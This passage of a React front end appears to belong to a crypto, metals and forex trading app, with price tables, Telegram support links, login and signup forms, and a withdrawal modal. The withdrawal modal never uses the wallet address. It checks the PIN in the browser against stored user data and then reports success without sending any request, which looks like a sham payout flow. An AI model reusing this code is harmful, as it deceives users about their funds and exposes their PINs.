              <div className="drawer-item" onClick={() => { window.open(telegramLink); setDrawerOpen(false); }}>🎧 Support</div>
              {isLoggedIn && <div className="drawer-item logout" onClick={() => { setIsLoggedIn(false); setActiveId(null); setCurrentPage('home'); setDrawerOpen(false); }}>🚪 Logout</div>}
            </div>
          </div>
      </div>

      <main className="main-content">
        {!libraryDocKey ? (
          <>
            <div className="market-tabs-container">
              <div className={`tab-item ${marketTab === 'crypto' ? 'active-crypto' : ''}`} onClick={() => setMarketTab('crypto')}>{t('crypto')}</div>
              <div className={`tab-item ${marketTab === 'metals' ? 'active-metals' : ''}`} onClick={() => setMarketTab('metals')}>{t('metals')}</div>
              <div className={`tab-item ${marketTab === 'forex' ? 'active-forex' : ''}`} onClick={() => setMarketTab('forex')}>{t('forex')}</div>
            </div>
            <div className="dashboard-container">
              {currentPage === 'home' && (
                <div className="dashboard-header">
                  <div className="dashboard-title">Market Prices</div>
                  <div className="market-status">
                    <span className={`status-dot ${marketStatus === 'live' ? 'online' : 'fallback'}`}></span>
                    <div className="status-info">
                      <span className="status-label">{marketStatus === 'live' ? 'Live pricing' : 'Benchmark pricing'}</span>
                      {marketStatus === 'fallback' && <span className="status-tooltip">Using Benchmark Pricing - Live sync paused.</span>}
                    </div>
                  </div>
                </div>
              )}
              {loading ? <div className="loading">{t('loadingMarkets')}</div> : (
              <table className="crypto-table">
                <thead><tr><th>Asset</th><th style={{textAlign:'center'}}>Price</th><th style={{textAlign:'right'}}>Action</th></tr></thead>
                <tbody>{availableMarkets().map(asset => (
                  <tr key={asset.id} className="price-row">
                    <td><div className="asset-cell"><img src={asset.image} width="20" alt="" />{asset.symbol.toUpperCase()}</div></td>
                    <td style={{textAlign:'center'}} className={`price-flash ${priceFlash[asset.id] || ''}`}>${asset.current_price.toLocaleString()}</td>
                    <td style={{textAlign:'right'}}><button className="trade-button" onClick={() => { setSelectedCoin(asset); setCurrentPage('trade'); }}>{t('trade')}</button></td>
                  </tr>))}
                </tbody>
              </table>
              )}
            </div>
          </>
        ) : (
          <div className="library-view-wrap library-view-wrap--enter" key={libraryDocKey}>
            <div className="library-toolbar glass-toolbar glass-toolbar--doc">
              <button type="button" className="back-btn-colored library-back-markets" onClick={() => setLibraryDocKey(null)}>
                Back to Markets
              </button>
              <h1 className="library-view-title">{LIBRARY_LABELS[libraryDocKey]}</h1>
            </div>
            <article className={`library-content-card library-content-card--premium ${libraryDocKey === 'regulatory-license' ? 'library-content-card--regulatory' : ''}`}>
              {libraryLoading && <p className="library-status">Loading…</p>}
              {libraryError && <p className="library-status library-status-error">{libraryError}</p>}
              {!libraryLoading && !libraryError && libraryDocKey === 'regulatory-license' && (
                <RegulatoryDocLayout bodyText={libraryBody} />
              )}
              {!libraryLoading && !libraryError && libraryDocKey === 'faq' && (
                <DocFaqView rawText={libraryBody} openIndex={faqOpenIndex} setOpenIndex={setFaqOpenIndex} />
              )}
              {!libraryLoading &&
                !libraryError &&
                libraryDocKey !== 'regulatory-license' &&
                libraryDocKey !== 'faq' && (
                  <div className="library-formatted-body">{formatLibraryDoc(libraryBody)}</div>
                )}
            </article>
          </div>
        )}
      </main>
      </>
      ) : (
        <ArbitragePage
          userId={activeId}
          userBalance={isLoggedIn ? Number(allUsers[activeId]?.balance) || 0 : 0}
          isLoggedIn={isLoggedIn}
          onBack={() => setCurrentPage('home')}
          onRequireLogin={() => setShowAuth(true)}
        />
      )}

      {/* Floating Support Button */}
      {currentPage === 'home' && !libraryDocKey && (
        <div className="floating-support" onClick={() => window.open(telegramLink)}>🎧</div>
      )}

      {/* --- MODALS --- */}
      {showAuth && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowAuth(false)}>×</button><h2>{authMode === 'login' ? t('login') : t('signUp')}</h2>
          {isLoadingUsers ? (
            <div style={{ textAlign: 'center', padding: '20px' }}>
              <div style={{ fontSize: '24px', marginBottom: '10px' }}>🔄</div>
              <div>{t('loadingUserData')}</div>
            </div>
          ) : (
            <form onSubmit={handleAuth}>
              {authMode === 'signup' && <input className="login-input" placeholder="Full Name" required onChange={e => setAuthData({...authData, name: e.target.value})} />}
              <input className="login-input" type="email" placeholder="Email" required onChange={e => setAuthData({...authData, email: e.target.value})} />
              <input className="login-input" type="password" placeholder="Password" required onChange={e => setAuthData({...authData, password: e.target.value})} />
              {authMode === 'signup' && <input className="login-input" maxLength="4" placeholder="Withdrawal PIN (4 digits)" required onChange={e => setAuthData({...authData, pin: e.target.value})} />}
              <button className="buy-btn" type="submit" disabled={isLoadingUsers}>{authMode === 'login' ? t('login') : t('signUp')}</button>
            </form>
          )}
          <p onClick={() => setAuthMode(authMode === 'login' ? 'signup' : 'login')} className="toggle-auth">{authMode === 'login' ? t('createAccount') : t('backToLogin')}</p></div></div>
      )}

      {showWithdraw && (
        <div className="modal-overlay"><div className="modal-content"><button className="close-btn" onClick={() => setShowWithdraw(false)}>×</button><h2>{t('withdrawAssets')}</h2>
          <input className="login-input" type="number" value={withdrawAmount} onChange={(e) => setWithdrawAmount(e.target.value)} placeholder="Amount (USDT)" />
          <input className="login-input" placeholder="Wallet Address (TRC20)" />
          <input className="login-input" type="password" maxLength="4" placeholder="Security PIN" onChange={e => setWithdrawPin(e.target.value)} />
          {Number(withdrawAmount) > allUsers[activeId].balance && <div className="error-message">Insufficient Balance</div>}
          <button className="buy-btn" disabled={Number(withdrawAmount) > allUsers[activeId].balance} onClick={() => { if(withdrawPin === allUsers[activeId].pin) {setWithdrawSuccess(true); setShowWithdraw(false); setWithdrawAmount(''); setWithdrawPin('');} else {alert("Wrong PIN");} }}>{t('verifySubmit')}</button></div></div>
      )}

      {withdrawSuccess && (
        <div className="modal-overlay"><div className="modal-content success-modal"><button className="close-btn" onClick={() => setWithdrawSuccess(false)}>×</button><h2>Withdraw Submission Successful</h2><p>Your withdrawal request has been submitted and is being processed.</p></div></div>
      )}

      {showResultModal && tradeResult && (
        <TradeResultModal
          isOpen={showResultModal}
          onClose={() => setShowResultModal(false)}
          tradeResult={tradeResult}
        />
      )}
    </div>
  );
}

export default function App() {
  return <AppInner />;
}

export { AppInner };





                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    